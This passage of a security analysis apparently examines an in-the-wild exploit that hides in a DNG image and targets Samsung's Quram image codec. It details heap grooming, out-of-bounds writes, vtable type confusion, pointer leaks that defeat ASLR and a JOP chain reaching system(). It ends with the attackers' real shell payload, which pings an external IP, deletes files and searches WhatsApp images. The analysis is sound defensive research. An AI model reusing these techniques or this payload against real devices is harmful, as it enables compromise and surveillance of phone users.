+      1 Parsing OpcodeList3: 5347 opcodes
+      1 Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
+    640 Opcode: TrimBounds, minVersion = 1.4.0.1, flags = 1
+   1040 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
+      1 Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
+</code></pre></div>
+
+<ul>
+  <li><code>QuramDngDecoder::buildStage2Image</code> will apply opcode list 1. When it is done, the 20000 unknown opcodes it contains are freed.</li>
+  <li><code>QuramDngDecoder::doBuildStage2</code> will allocate a <code>QuramDngImage</code> “stage 2” (size 0x30) and convert stage 1 to stage 2. This stage 2 image will take the spot of the last opcode of opcode list 1 that was freed.</li>
+  <li><code>QuramDngDecoder::buildStage2Image</code> can now free the “stage 1” <code>QuramDngImage</code>. It will then process the opcode list 2, and free the 240 “unknown” opcodes.</li>
+  <li><code>QuramDngDecoder::doInterpolateStage3</code> will allocate both a new “stage 3” <code>QuramDngImage</code> (size 0x30) and subsequently a raw pixel buffer of size 0x30. These will take the spots of the last 2 opcodes freed from opcode list 2 in the previous step.</li>
+  <li><code>QuramDngDecoder::buildStage3Image</code> can now free the “stage 2” <code>QuramDngImage</code>.</li>
+  <li>Opcode list 3 gets processed now. In the first <code>TrimBounds</code> opcode, <code>QuramDngOpcodeTrimBounds::doApply</code> will allocate a new raw pixel buffer of size 0x30 (although the replaced raw pixel buffer has the exact same size). This allocation will take the spot of the freed stage 2 image.
+    <ul>
+      <li>Note that the 640 other <code>TrimBounds</code> opcodes have a “minVersion” of 1.4.0.1. This is a trick that will make <code>QuramDngOpcode::aboutToApply</code> bail out early and not have the <code>TrimBounds</code> actually executed. The goal of spraying these 640 <code>TrimBounds</code> opcodes will become clear later.</li>
+    </ul>
+  </li>
+</ul>
+
+<div><p>The eventual heap layout for chunks of size 0x30 is illustrated below. The annotated offsets will be important later on.</p><p>
+
+<img alt="" /></p><p>
+
+Note that because of scudo’s randomization strategy, the allocations of different opcode lists will actually overlap slightly (on the order of 52 allocations), but given enough allocations this effect can be neglected.</p></div>
+
+<p>Because the allocations have chunk sizes of 0x30 bytes, they take up 0x40 bytes on the heap. Different chunks in this heap region are thus spaced by multiples of 0x40 bytes, which will help us in quickly inferring what parts of an object are being corrupted. The illustration also depicts the sizes the allocations occupy in total, which will be important for understanding the subsequent exploitation flow.</p>
+
+<p>As we’ll see, the exploit will write out of bounds from the raw pixel buffer of stage 3 into the QuramDngImage of stage 3. This explains why the attackers first used a TrimBounds opcode before triggering the bug: it assures that the raw pixel buffer will end up <em>before</em> the <code>QuramDngImage</code>. Without it, there would be a one out of two chance that the raw pixel buffer takes a spot <em>after</em> the QuramDngImage.</p>
+
+<h3>The initial corruption</h3>
+
+<p>After achieving the right heap layout using the <code>TrimBounds</code>, 480 <code>DeltaPerColumn</code> opcodes follow. As a reminder, these are allocated in a different heap region because of a different allocation size. As discussed, <code>DeltaPerColumn</code> opcodes are able to add arbitrary values to arbitrary offsets out of bounds. The attackers add 0x6666 to offsets 10 and 12 within 240 heap objects, starting at offset 0x2800 from the raw pixel buffer and ending at offset 0x6400.</p>
+
+<p>Looking at our heap layout, we will corrupt three types of objects at these offsets:</p>
+
+<ul>
+  <li><code>Unknown</code> and <code>TrimBounds</code> opcodes: opcode structures contain the opcode ID at offset 8 and the specification version at offset 12. Since the opcode IDs will be corrupted, these <code>TrimBounds</code> and <code>Unknown</code> opcodes will simply be skipped later on (which was already the case for the <code>Unknown</code> opcodes).</li>
+</ul>
+
+<div><pre><code>Before:
+0xb400007e3e3fa050:     0x0000007fee5a3fb0      0x0104000000000017
+0xb400007e3e3fa060:     0x0000000100000001      0x0000000000000002
+0xb400007e3e3fa070:     0x0000000000000000      0x0000000000000000
+After:
+0xb400007e3e3fa050:     0x0000007fee5a3fb0      0x676a000066660017
+0xb400007e3e3fa060:     0x0000000100000001      0x0000000000000002
+0xb400007e3e3fa070:     0x0000000000000000      0x0000000000000000
+</code></pre></div>
+
+<ul>
+  <li>Most importantly, it will encounter the <code>QuramDngImage</code> object. The two corrupted fields of this object are the “bottom” and “right” fields of the image, which are used in other opcode handlers for verifying if operations are within bounds. This means that we can now use other opcodes, such as MapTable, to perform actions out of bounds.</li>
+</ul>
+
+<div><pre><code>Before:
+0xb400007e3e3fb810:     0x0000000000000000      0x0000000100000001
+0xb400007e3e3fb820:     0x0000000300000003      0xb400007f1e2d7ad0
+0xb400007e3e3fb830:     0xb400007e3e3f7850      0x0000000000000030
+After:
+0xb400007e3e3fb810:     0x0000000000000000      0x6666000166660001
+0xb400007e3e3fb820:     0x0000000300000003      0xb400007f1e2d7ad0
+0xb400007e3e3fb830:     0xb400007e3e3f7850      0x0000000000000030
+</code></pre></div>
+
+<p>If we look for example at the first MapTable that follows, it looks like:</p>
+
+<div><pre><code>Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+AreaSpec: t=0, l=5120, b=1, r=5121, p=0:1, rp=1, cp=1
+Count: 65536
+</code></pre></div>
+
+<p>Under regular circumstances, the “left” and “right” value would be out of bounds and this opcode would not perform any operation. Because we corrupted the dimensions of the QuramDngImage though, this opcode will operate out of bounds.</p>
+
+<h3>Extending the primitives</h3>
+
+<p>Incrementing arbitrary out of bound values with chosen values is a powerful primitive, but the exploit will also want to write absolute arbitrary values out of bounds. The former can be converted pretty easily into the latter though.</p>
+
+<p>If we have a primitive to write zeros out of bounds, we can combine that with the increment primitive to write arbitrary values in two steps: zero the memory and then increment it with the value we want to write.</p>
+
+<p>Zeroing memory can be done in two ways, and both are used in the exploit:</p>
+
+<ul>
+  <li>Using the <code>MapTable</code> opcode with a substitution table of all zeros</li>
+  <li>Using the <code>DeltaPerColumn</code> opcode. The “Delta” parameter is a float, and -Infinity is supported, which sets the resulting value to 0.</li>
+</ul>
+
+<p>In the exploit, <code>MapTable</code> is only used to zero large regions, likely because of the large space overhead of the <code>MapTable</code> opcode (as it requires a substitution table of 65536 values to be included).</p>
+
+<h3>Crafting a bogus MapTable opcode</h3>
+
+<p>With linear out-of-bounds write primitive in place, the exploit could now:</p>
+
+<ul>
+  <li>Write a shell command somewhere out of bounds</li>
+  <li>Write a JOP gadget chain somewhere out of bounds which ends up calling <code>system()</code></li>
+  <li>Overwrite the vtable pointer of one of the opcode objects to be executed to kick off the JOP chain, resulting in a <code>system(&lt;shell command&gt;)</code> execution</li>
+</ul>
+
+<p>There is one important issue though: we don’t know any of the required addresses, since both the heap and the libraries are subject to ASLR. To leak the addresses of the JOP gadgets, the exploit has to do a bit more work.</p>
+
+<p>Let’s show the first <code>MapTable</code> opcode again:</p>
+
+<div><pre><code>Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
+AreaSpec: t=0, l=5120, b=1, r=5121, p=0:1, rp=1, cp=1
+Count: 65536
+</code></pre></div>
+
+<div><p>This opcode will act on offset <code>5120 x 2 bytes/pixel x 3 colors/pixel = 0x7800</code> from the raw pixel buffer, which is in the region of those 641 TrimBounds opcodes.</p><p>
+
+<img alt="" /></p><p>
+
+It is corrupting the lower 2 bytes of the vtable pointer of a <code>TrimBounds</code> opcode object. Looking at the substitution table, most values are mapped to itself, however a few are not. (We had to write an additional script to parse this out, since <code>dng_validate</code>’s output of these long substitution tables is truncated).
+For example, the value 0xecf0 is mapped to 0xed30. Looking at the <code>libimagecodec.quram.so</code> binary, the new address points to the <code>MapTable</code> vtable. This trick allows the attackers to “type confuse” a <code>TrimBounds</code> opcode to a <code>MapTable</code> opcode, by moving the vtable pointer to a different one, without having to leak any ASLR first.</p></div>
+
+<p>Their substitution table supports different versions of the library, which works because there are not that many versions of the library (the exploit supports 7 versions) and the lower bytes of the vtable do not collide. Moreover, since ASLR is applied at page level granularity, they need to account for every page multiple the vtable can be mapped at. Say we have the following vtable offsets:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th><code>libimagecodec.quram.so</code> version x</th>
+      <th><code>libimagecodec.quram.so</code> version y</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>QuramDngOpcodeTrimBounds</code> vtable offset</td>
+      <td><code>0x2dccf0</code></td>
+      <td><code>0x2dce10</code></td>
+    </tr>
+    <tr>
+      <td><code>QuramDngOpcodeMapTable</code> vtable offset</td>
+      <td><code>0x2dcd30</code></td>
+      <td><code>0x2dce50</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Then the following <code>MapTable</code> substitution table would be constructed (omitting values that don’t matter and can map to whatever):</p>
+
+<div><pre><code>index  : value
+0x0cf0 : 0x0d30
+0x0e10 : 0x0e50
+0x1cf0 : 0x1d30
+0x1e10 : 0x1e50
+0x2cf0 : 0x2d30
+0x2e10 : 0x2e50
+0x3cf0 : 0x3d30
+0x3e10 : 0x3e50
+0x4cf0 : 0x4d30
+0x4e10 : 0x4e50
+0x5cf0 : 0x5d30
+0x5e10 : 0x5e50
+0x6cf0 : 0x6d30
+0x6e10 : 0x6e50
+0x7cf0 : 0x7d30
+0x7e10 : 0x7e50
+0x8cf0 : 0x8d30
+0x8e10 : 0x8e50
+0x9cf0 : 0x9d30
+0x9e10 : 0x9e50
+0xacf0 : 0xad30
+0xae10 : 0xae50
+0xbcf0 : 0xbd30
+0xbe10 : 0xbe50
+0xccf0 : 0xcd30
+0xce10 : 0xce50
+0xdcf0 : 0xdd30
+0xde10 : 0xde50
+0xecf0 : 0xed30
+0xee10 : 0xee50
+0xfcf0 : 0xfd30
+0xfe10 : 0xfe50
+</code></pre></div>
+
+<p>Using the previously described arbitrary write primitive, the exploit also corrupts various fields of the <code>TrimBounds</code> object to transform it into a functional bogus <code>MapTable</code> object. Note that a regular <code>MapTable</code> opcode object is bigger than a <code>TrimBounds</code> opcode and would hence also land in a different scudo heap class in normal circumstances. Obviously, the library is unaware and will just read opcode arguments out of bounds in this case.</p>
+
+<p>The constructed bogus <code>MapTable</code> opcode object looks like this:</p>
+
+<div><pre><code>
+
+Before:
+00007800: f0fc f8cc 7f00 0000 0600 0000 0100 0401  // TrimBounds opcode X
+00007810: 0100 0000 0100 0000 0300 0000 0000 0000  
+00007820: 0000 0000 0100 0000 0100 0000 0000 0000  
+00007830: 0301 0300 0000 71ca 0000 0000 0000 0000  
+00007840: f0fc f8cc 7f00 0000 0600 0000 0100 0401  // TrimBounds opcode Y
+
+After:
+00007800: 30fd f8cc 7f00 0000 0600 0000 <b>0000</b> 0401  
+           | |                           \-\---&gt; Will prevent bailout in QuramDngOpcode::aboutToApply
+           \---&gt; changed vtable pointer, from TrimBounds to MapTable 
+00007810: 0100 0000 0100 0000 0300 0000 <b>0000 0000  // Arguments of bogus Maptable,
+00007820: 0028 0000 0100 0000 982c 0000 0000 0000  // such as top, left, bottom, right,
+00007830: 0100 0000 0100 0000 0100 0000</b> 0000 0000  // plane, planes, ...
+00007840: f0fc f8cc 7f00 0000 0600 0000 0100 0401 
+          \-\--\-\--\-\--\-\----&gt; vtable of the neighboring TrimBounds opcode, interpreted here
+                                  as the pointer to the MapTable's substitution table 
+</code></pre></div>
+
+<p>The whole goal of this construction is to have the vtable of another opcode object as the pointer for the MapTable substitution table. If we zero out the memory this MapTable will be applied to beforehand, this will result in a read of two bytes from the TrimBounds vtable, i.e. a leak.</p>
+
+<div><pre><code>/-&lt; Zero'ed memory at offset 0xf000:                   0000 0000 0000 0000 0000 ...
+|
+|-&lt; MapTable substitution table (TrimBounds vtable):   04b2 a4cd 7f00 0000 a85e ....
+|
+\-&gt; Transformed memory at offset 0xf000:               04b2 04b2 04b2 04b2 04b2 ....
+</code></pre></div>
+
+<h3>Leaking interesting pointers</h3>
+
+<p>Using the above technique, we can leak arbitrary values at offsets from the TrimBounds vtable. We demonstrated this for offset 0, but the same idea can be applied for other offsets (up to 65536, the maximum index into the substitution table).</p>
+
+<p>Say you want to leak a pointer at offset 0x1f8 from the TrimBounds vtable. This can be achieved in the following way:</p>
+
+<div><pre><code>/-&lt; Prepared memory at offset 0xf000:                                   f001 f101 f201 f301 ...
+|
+|-&lt; MapTable substitution table (TrimBounds vtable) at offset 0x1f0:    4c5a ebcc 7f00 0000 ....
+|
+\-&gt; Transformed memory at offset 0xf000:                                4c5a ebcc 7f00 0000 ....
+</code></pre></div>
+
+<p>But again, the exploit needs to support different library versions. These different library versions have pointers to leak at different offsets from the vtable. But based on the first leak at offset 0, we can “calculate” the right offsets to leak using another <code>MapTable</code> operation.</p>
+
+<p>In summary the process goes as follows (illustrated below):</p>
+
+<ol>
+  <li>Corrupt a <code>TrimBounds</code> opcode into a <code>MapTable</code> object with the substitution table pointing at the <code>TrimBounds</code> vtable.</li>
+  <li>Have the bogus <code>MapTable</code> opcode process an area of all zeros. The substituted values will be the lower 2 bytes of the first vtable entry (which is the address of <code>QuramDngOpcode::~QuramDngOpcode()</code>). The top nibble will depend on the ASLR slide, and the lower 3 nibbles will be version dependent.</li>
+  <li>Using <code>MapTable</code> opcodes with well prepared substitution tables (supporting different ASLR slides and library versions), substitute those values to the offset between the <code>TrimBounds</code> vtable and the address of the pointer to leak.</li>
+  <li>Similar to step 1, corrupt another TrimBounds opcode into a MapTable object with the substitution table pointing at the TrimBounds vtable.</li>
+  <li>The bogus <code>MapTable</code> will now substitute the offsets from the vtable into their respective values, effectively writing a leaked pointer into memory.</li>
+</ol>
+
+<p><img alt="" /></p>
+
+<p>The memory used for preparing these pointers is at offset 0xf000 from the raw pixel buffer, which contains the last series of 1040 “unknown” opcodes. This memory will become the JOP chain.</p>
+
+<p>The leaked pointers are mostly pointers to functions inside <code>libimagecodec.quram.so</code>, as well as the value of libc’s <code>__system_property_get</code>, which is located in the GOT. Conveniently the .got segment is located after the <code>TrimBounds</code>’s vtable, and within a 65536 bytes offset.</p>
+
+<h3>Preparing the payload</h3>
+
+<p>By using more MapTable operations, we can change the leaked pointers to the JOP gadget addresses we are interested in. The leaked libc pointer is changed to the address of <code>system</code>.</p>
+
+<p>This is an overview of the leaked pointers and to what they are changed:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Raw pixel buffer offset</th>
+      <th>Leaked value</th>
+      <th>Remapped value for JOP chain</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0xf000</td>
+      <td><code>QuramDngFunctionExposureRamp::~QuramDngFunctionExposureRamp()</code></td>
+      <td><code>qpng_check_fp_number@got.plt</code></td>
+    </tr>
+    <tr>
+      <td>0xf038</td>
+      <td><code>QuramDngFunctionExposureRamp::evaluate(double)</code></td>
+      <td><code>qpng_check_IHDR+624</code></td>
+    </tr>
+    <tr>
+      <td>0xf118</td>
+      <td><code>QuramDngException::~QuramDngException()</code></td>
+      <td><code>__ink_jpeg_enc_process_image_data+64</code></td>
+    </tr>
+    <tr>
+      <td>0xf138</td>
+      <td><code>QuramDngException::~QuramDngException()</code></td>
+      <td><code>__ink_jpeg_enc_process_image_data+64</code></td>
+    </tr>
+    <tr>
+      <td>0xf928</td>
+      <td><code>QuramDngFunctionExposureRamp::evaluate(double)</code></td>
+      <td><code>QURAMWINK_Read_IO2+124</code></td>
+    </tr>
+    <tr>
+      <td>0x10928</td>
+      <td><code>__system_property_get_ptr</code></td>
+      <td><code>system</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>A long shell command is also prepared at offset 0x10000 from the raw pixel buffer, which also falls in that 1040 <code>Unknown</code> opcodes region.</p>
+
+<p>We end up with:</p>
+
+<ul>
+  <li>a JOP chain prepared at 0xf000. Note that it is preceded by one of the 1040 <code>Unknown</code> opcodes with opcode ID 23 (0x17)</li>
+</ul>
+
+<p><img alt="" /></p>
+
+<ul>
+  <li>a shell command at offset 0x10000. Note again how it is within the region of the <code>Unknown</code> opcodes</li>
+</ul>
+
+<p><img alt="" /></p>
+
+<p><img alt="" /></p>
+
+<h3>Triggering the JOP chain</h3>
+
+<p>Similar to our initial corruption, we increment values between 0x2800 and 0x6400 with 1, but this time at offset 0x22 within the objects, using <code>DeltaPerColumn</code> opcodes. The opcode objects there have been executed by now, so this does not affect them. However, the <code>QuramDngImage</code> is also there and offset 0x20 in the QuramDngImage is a pointer to the raw pixel buffer. By adding 1 to offset 0x22, we basically shift the raw pixel buffer pointer with 0x10000 bytes, pointing it right at the shell command.</p>
+
+<p>Finally, the DNG decoder will execute that last series of 1040 “unknown” opcodes. Offset 0xf000 - where we prepared our JOP chain - falls nicely on the boundary of one of those opcodes, so it will be executed as another opcode.</p>
+
+<p><code>QuramDngOpcode::aboutToApply</code> reads the bogus vtable pointer at raw pixel buffer offset 0xf000 and calls the fourth function in it, which will be <code>qpng_read_data</code>.</p>
+
+<div><pre><code><span>QuramDngOpcodeUnknown</span> <span>*</span><span>__fastcall</span> <span>QuramDngOpcode</span><span>::</span><span>aboutToApply</span><span>(</span><span>QuramDngOpcode</span> <span>*</span><span>opcode</span><span>,</span> <span>QuramDngDecoder</span> <span>*</span><span>decoder</span><span>)</span>
+<span>{</span>
+    <span>int</span> <span>v2</span><span>;</span> <span>// w8</span>
+    <span>QuramDngOpcodeUnknown</span> <span>*</span><span>v5</span><span>;</span> <span>// x0</span>
+    <span>unsigned</span> <span>int</span> <span>v6</span><span>;</span> <span>// w1</span>
+
+    <span>v2</span> <span>=</span> <span>*</span><span>((</span><span>_DWORD</span> <span>*</span><span>)</span><span>opcode</span> <span>+</span> <span>4</span><span>);</span>
+    <span>if</span> <span>(</span> <span>(</span><span>v2</span> <span>&amp;</span> <span>2</span><span>)</span> <span>!=</span> <span>0</span> <span>&amp;&amp;</span> <span>*</span><span>((</span><span>_BYTE</span> <span>*</span><span>)</span><span>decoder</span> <span>+</span> <span>34</span><span>)</span> <span>)</span>
+    <span>{</span>
+        <span>*</span><span>((</span><span>_BYTE</span> <span>*</span><span>)</span><span>decoder</span> <span>+</span> <span>5377</span><span>)</span> <span>=</span> <span>1</span><span>;</span>
+        <span>return</span> <span>0</span><span>;</span>
+    <span>}</span>
+    <span>if</span> <span>(</span> <span>*</span><span>((</span><span>_DWORD</span> <span>*</span><span>)</span><span>opcode</span> <span>+</span> <span>3</span><span>)</span> <span>&gt;=</span> <span>0x1040001u</span> <span>&amp;&amp;</span> <span>*</span><span>((</span><span>_BYTE</span> <span>*</span><span>)</span><span>opcode</span> <span>+</span> <span>0x14</span><span>)</span> <span>)</span>
+    <span>{</span>
+        <span>if</span> <span>(</span> <span>(</span><span>v2</span> <span>&amp;</span> <span>1</span><span>)</span> <span>!=</span> <span>0</span> <span>)</span>
+            <span>return</span> <span>0</span><span>;</span>
+        <span>Throw_dng_error</span><span>(</span><span>-</span><span>9994</span><span>,</span> <span>0</span><span>,</span> <span>"QuramDngOpcode::aboutToApply 1"</span><span>,</span> <span>0</span><span>);</span>
+    <span>}</span>
+    <span>if</span> <span>(</span> <span>((</span><span>*</span><span>(</span><span>__int64</span> <span>(</span><span>__fastcall</span> <span>**</span><span>)(</span><span>QuramDngOpcode</span> <span>*</span><span>,</span> <span>QuramDngDecoder</span> <span>*</span><span>))(</span><span>*</span><span>(</span><span>_QWORD</span> <span>*</span><span>)</span><span>opcode</span> <span>+</span> <span>0x18LL</span><span>))(</span><span>opcode</span><span>,</span> <span>decoder</span><span>)</span> <span>// bogus vtable dereference</span>
+        <span>&amp;</span> <span>1</span><span>)</span> <span>!=</span> <span>0</span> <span>)</span>
+    <span>{</span>
+        <span>return</span> <span>(</span><span>QuramDngOpcodeUnknown</span> <span>*</span><span>)(((</span><span>*</span><span>(</span><span>__int64</span> <span>(</span><span>__fastcall</span> <span>**</span><span>)(</span><span>QuramDngOpcode</span> <span>*</span><span>))(</span><span>*</span><span>(</span><span>_QWORD</span> <span>*</span><span>)</span><span>opcode</span> <span>+</span> <span>16LL</span><span>))(</span><span>opcode</span><span>)</span>
+                                        <span>&amp;</span> <span>1</span><span>)</span> <span>==</span> <span>0</span><span>);</span>
+    <span>}</span>
+    <span>else</span>
+    <span>{</span>
+        <span>v5</span> <span>=</span> <span>(</span><span>QuramDngOpcodeUnknown</span> <span>*</span><span>)</span><span>Throw_dng_error</span><span>(</span><span>-</span><span>9994</span><span>,</span> <span>0</span><span>,</span> <span>"QuramDngOpcode::aboutToApply 2"</span><span>,</span> <span>0</span><span>);</span>
+        <span>return</span> <span>QuramDngOpcodeUnknown</span><span>::</span><span>QuramDngOpcodeUnknown</span><span>(</span><span>v5</span><span>,</span> <span>v6</span><span>);</span>
+    <span>}</span>
+<span>}</span>
+</code></pre></div>
+
+<div><pre><code>.got:00000000002E3390 qpng_check_fp_number_ptr DCQ qpng_check_fp_number  // address of vtable placed at offset 0xf000
+.got:00000000002E3398 _ZNK17QuramDngSrational9getReal64Ev_ptr DCQ QuramDngSrational::getReal64(void)
+.got:00000000002E33A0 qpng_write_IHDR_ptr DCQ qpng_write_IHDR 
+.got:00000000002E33A8 qpng_read_data_ptr DCQ qpng_read_data  // bogus vtable entry that will be called
+</code></pre></div>
+
+<p>When <code>qpng_read_data gets called</code>, <code>x0</code> will point to the opcode, as it is a method call. <code>x1</code> points to the decoder, but is not important for the JOP chain. <code>x2</code> is not specifically set up for this function call, but it still points to the <code>QuramDngImage</code> from <code>QuramDngOpcodeList::doApply</code> higher up the stack (it has not been clobbered). <code>x2</code> pointing to the <code>QuramDngImage</code> is important for the JOP chain.</p>
+
+<p><code>qpng_read_data</code> will move <code>x0</code> into <code>x19</code> and call the next gadget, <code>__ink_jpeg_enc_process_image_data+64</code>.</p>
+
+<div><pre><code>qpng_read_data:
+0000000000196684    STP  X20, X19, [SP,#-0x10+var_10]!
+0000000000196688    STP  X29, X30, [SP,#0x10+var_s0]
+000000000019668C    ADD  X29, SP, #0x10
+0000000000196690    LDR  X8, [X0,#0x138]        ; x8: __ink_jpeg_enc_process_image_data+64
+0000000000196694    MOV  X19, X0                ; x19: opcode (offset 0xf000 from the raw pixel buffer)
+0000000000196698    CBZ  X8, loc_1966C0
+000000000019669C    MOV  X0, X19
+00000000001966A0    MOV  X20, X2                ; x20: QuramDngImage
+00000000001966A4    BLR  X8                     ; __ink_jpeg_enc_process_image_data+64
+</code></pre></div>
+
+<p>We jump in the middle of <code>__ink_jpeg_enc_process_image</code>, which adds 0x20 to the QuramDngImage pointer, having <code>x1</code> point at the address that contains the raw pixel buffer pointer:</p>
+
+<div><pre><code>__ink_jpeg_enc_process_image_data+64:
+0000000000161664    LDR  X8, [X19,#0x928]  ; x19: opcode (offset 0xf000 from the raw pixel buffer)
+                                           ; x8: QURAMWINK_Read_IO2+124
+0000000000161668    ADD  X1, X20, #0x20    ; x20: QuramDngImage 
+                                           ; x1: address of QuramDngImage.raw_pixel_buffer
+000000000016166C    MOV  X0, X19           ; not relevant
+0000000000161670    BLR  X8                ; QURAMWINK_Read_IO2+124
+</code></pre></div>
+
+<p><code>QURAMWINK_Read_IO2+124</code> then dereferences <code>x1</code>, which loads the raw pixel buffer pointer into <code>x1</code>:</p>
+
+<div><pre><code>QURAMWINK_Read_IO2+124:
+0000000000154548    LDR  X8, [X19,#0x38]  ; x19: opcode (offset 0xf000 from the raw pixel buffer)
+                                          ; x8: qpng_check_IHDR+624
+000000000015454C    LDR  X0, [X19,#8]     ; clobbers x0
+0000000000154550    LDR  X1, [X1]         ; x1: dereference address of QuramDngImage.raw_pixel_buffer,
+                                          ;     so x1 points to the raw pixel buffer, which was increased
+                                          ;     with 0x10000 and now points at the shell command
+0000000000154554    BLR  X8               ; qpng_check_IHDR+624
+</code></pre></div>
+
+<p><code>qpng_check_IHDR+624</code> calls <code>qpng_error</code>, which copies the raw pixel buffer pointer from <code>x1</code> into <code>x19</code>:</p>
+
+<div><pre><code>qpng_check_IHDR+624:
+0000000000189608    MOV  X0, X19                        ; x19: opcode (offset 0xf000 from the raw pixel buffer)
+000000000018960C    BL   .qpng_error
+
+qpng_error:
+000000000018BD30    STP  X20, X19, [SP,#-0x10+var_10]!  
+000000000018BD34    STP  X29, X30, [SP,#0x10+var_s0]
+000000000018BD38    ADD  X29, SP, #0x10
+000000000018BD3C    MOV  X19, X1                        ; x19: address of shell command
+000000000018BD40    MOV  X20, X0
+000000000018BD44    CBZ  X0, loc_18BD5C
+000000000018BD48    LDR  X8, [X20,#0x118]               ; x8: __ink_jpeg_enc_process_image+64
+000000000018BD4C    CBZ  X8, loc_18BD5C
+000000000018BD50    MOV  X0, X20                       
+000000000018BD54    MOV  X1, X19                       
+000000000018BD58    BLR  X8                             ; __ink_jpeg_enc_process_image+64
+</code></pre></div>
+
+<p>We execute a second time the <code>__ink_jpeg_enc_process_image+64</code> gadget, which copies the raw pixel buffer pointer into <code>x0</code> and calls <code>system</code>. The raw pixel buffer was corrupted before the JOP chain to point at the shell command, resulting in a <code>system(&lt;shell_command&gt;)</code> call.</p>
+
+<div><pre><code>__ink_jpeg_enc_process_image+64:
+0000000000161664    LDR  X8, [X19,#0x928]  ; x19: address of shell command
+                                           ; x8: system
+0000000000161668    ADD  X1, X20, #0x20
+000000000016166C    MOV  X0, X19           ; x0: address of shell command
+0000000000161670    BLR  X8                ; system
+</code></pre></div>
+
+<p>Below is a summary of the sequence of gadgets and their purpose:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Gadget</th>
+      <th>Relevant instructions</th>
+      <th>Purpose</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>qpng_read_data</code></td>
+      <td><code>MOV X19, X0<br />MOV X20, X2</code></td>
+      <td>Copy the opcode address into <code>x19</code> and the <code>QuramDngImage</code> address into <code>x20</code></td>
+    </tr>
+    <tr>
+      <td><code>__ink_jpeg_enc_process_image_data+64</code></td>
+      <td><code>ADD X1, X20, #0x20</code></td>
+      <td>Have <code>x1</code> point at <code>QuramDngImage+0x20</code> (which contains the raw pixel buffer pointer)</td>
+    </tr>
+    <tr>
+      <td><code>QURAMWINK_Read_IO2+124</code></td>
+      <td><code>LDR X1, [X1]</code></td>
+      <td>Dereference <code>x1</code>, so it contains the raw pixel buffer pointer</td>
+    </tr>
+    <tr>
+      <td><code>qpng_check_IHDR+624</code> → <code>qpng_error</code></td>
+      <td><code>MOV X19, X1</code></td>
+      <td>Copy the raw pixel buffer pointer from <code>x1</code> into <code>x19</code></td>
+    </tr>
+    <tr>
+      <td><code>__ink_jpeg_enc_process_image+64</code></td>
+      <td><code>LDR X8, [X19,#0x928]</code><br /><code>MOV X0, X19</code><br /><code>BLR X8</code></td>
+      <td>Copy the raw pixel buffer from <code>x19</code> into <code>x0</code> and call <code>system</code>. The raw pixel buffer was corrupted before the JOP chain to point at the shell command</td>
+    </tr>
+    <tr>
+      <td><code>system</code></td>
+      <td> </td>
+      <td>Execute the shell command</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Payload</h2>
+
+<p>The payload shell command is:</p>
+
+<div><pre><code>/system/bin/sh <span>-c</span> <span>'ping -c 1 -w1 -p 2066c1d8ce2834f1fbb1296f9dca73419 91.132.92.35 &gt;/dev/null &amp; '</span><span>;</span> <span>pid</span><span>=</span><span>`</span><span>cat</span> /proc/self/stat | <span>cut</span> <span>-F</span> 4<span>`</span> <span>&amp;&amp;</span> <span>ppid</span><span>=</span><span>`</span><span>cat</span> /proc/<span>$pid</span>/stat | <span>cut</span> <span>-F</span> 4<span>`</span><span>;</span>
+<span>rm</span> <span>-f</span> /data/data/com.samsung.ipservice/files/b.so<span>;</span>
+<span>rm</span> <span>-f</span> /data/data/com.samsung.ipservice/files/z.zip<span>;</span>
+<span>image</span><span>=</span><span>`</span>find /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/95/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1000/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1001/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1002/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1003/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1004/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1005/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1006/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1007/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1008/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1009/Media/WhatsApp<span>\ </span>Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1010/Media/WhatsApp<span>\ </span>Images/ <span>-type</span> f <span>-atime</span> <span>-720m</span> <span>-maxdepth</span> 1 <span>-exec</span> <span>grep</span> <span>-lo</span> <span>'.*066c1d8ce2834f1fbb1296f9dca73419.*'</span> <span>{}</span> <span>\;</span> <span>-quit</span> 2&gt;/dev/null<span>`</span> <span>;</span>
+/system/bin/sh <span>-c</span> <span>'ping -c 1 -w1 -p $(test "$image" &amp;&amp; echo 31066c1d8ce2834f1fbb1296f9dca73419 || echo 30066c1d8ce2834f1fbb1296f9dca73419) 91.132.92.35 &gt;/dev/null &amp; '</span> <span>;</span>
